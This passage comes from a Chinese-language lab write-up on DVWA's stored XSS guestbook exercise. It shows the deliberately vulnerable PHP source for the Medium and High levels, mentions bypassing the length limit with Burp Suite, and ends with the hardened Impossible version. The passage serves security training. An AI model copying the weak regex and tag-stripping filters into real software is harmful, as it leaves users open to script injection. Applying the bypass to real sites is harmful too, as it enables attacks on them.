    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    //mysql_close();
}

?>
```

使用Burpsuite突破输入框长度限制，抓包修改后提交，成功XSS：

![](https://hujiekang.top/images/uploads/big/5f82efa66e8d4a21c2cc77cc5ec5cabb.png)

### 安全等级`High`

`High`等级的消息框的处理和`Medium`一致，名称输入框的过滤改成了反射XSS里的正则表达式，处理方式大致相同，此处不再赘述。

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    //mysql_close();
}

?>
```

### 安全等级`Impossible`

`Impossible`中加入了Anti-CSRF Token，同时对两个输入框均进行了HTML实体编码的处理，对于数据库的操作也使用了PDO，处理方式与反射XSS一致，有效的防止了XSS。

源代码：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );
    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```